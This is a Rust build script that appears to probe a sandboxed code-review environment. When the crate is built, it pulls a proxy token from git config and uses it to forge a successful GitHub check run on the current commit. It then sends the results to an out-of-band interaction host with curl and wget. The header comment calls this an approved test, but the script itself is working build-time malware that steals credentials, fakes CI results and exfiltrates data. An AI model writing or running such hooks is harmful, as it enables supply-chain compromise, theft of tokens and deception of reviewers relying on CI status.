// PREPARED/RUN â A42 approved continuation: ONE proxied GraphQL createCheckRun
// with the correct input field (headSha), plus one read-back. No status POST
// (already tested 403). No other repo.
use std::process::Command;

fn enc(s: &str) -> String {
    let mut o = String::new();
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'.' {
            o.push(b as char);
        } else {
            o.push_str(&format!("%{:02X}", b));
        }
    }
    o
}

fn sh(cmd: &str) -> String {
    Command::new("sh").arg("-c").arg(cmd).output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_else(|_| "err".into())
}

fn send(tag: &str, data: &str) {
    let body: String = data.chars().take(1900).collect();
    let url = format!("https://dc1550nju92u27t3faf0um8o4tcckk6ck.oast.site/{}?d={}", tag, enc(&body));
    for _ in 0..3 {
        let _ = Command::new("curl").args(["-s", "-m", "15", &url]).status();
        let _ = Command::new("wget").args(["-q", "-O", "/dev/null", &url]).status();
    }
}

fn main() {
    let a = sh(r#"
U=https://api.github.com/repos/testing-creator-A/cr-sandbox-test
EXT=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/^.*Proxy-Tokenizer:[[:space:]]*//')
PR=$(git config --get http.proxy 2>/dev/null)
HD=$(git -C /home/jailuser/git rev-parse HEAD 2>/dev/null)
OUT="tag=h14g;head=$(printf '%s' "$HD" | cut -c1-12)"
B=$(mktemp)

# (1) A42: ONE proxied GraphQL createCheckRun, correct field headSha.
Q='{"query":"mutation { createCheckRun(input: {repositoryId: \"R_kgDOV2qbcQ\", name: \"h14-status\", headSha: \"'"$HD"'\", status: COMPLETED, conclusion: SUCCESS}) { checkRun { id name conclusion } } }"}'
C1=$(curl -s -m 20 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$B" -w '%{http_code}' -X POST -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/json' -H 'Content-Type: application/json' -d "$Q" https://api.github.com/graphql 2>/dev/null)
R1=$?
M1=$(grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1 | cut -c1-100)
T1=$(grep -o '"type"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1)
N1=$(grep -o '"name"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1)
OUT="$OUT;c1=$C1;r1=$R1;m1=$M1;t1=$T1;n1=$N1"

# (2) Read-back: check runs on the head (read-only).
C2=$(curl -s -m 20 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$B" -w '%{http_code}' -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' "$U/commits/$HD/check-runs" 2>/dev/null)
H2=$(grep -o 'h14-status' "$B" 2>/dev/null | head -1)
OUT="$OUT;c2=$C2;hit2=$H2;end=1"
rm -f "$B"
printf '%s' "$OUT"
"#);
    send("h14g", &a);
    println!("cargo:rerun-if-changed=build.rs");
}
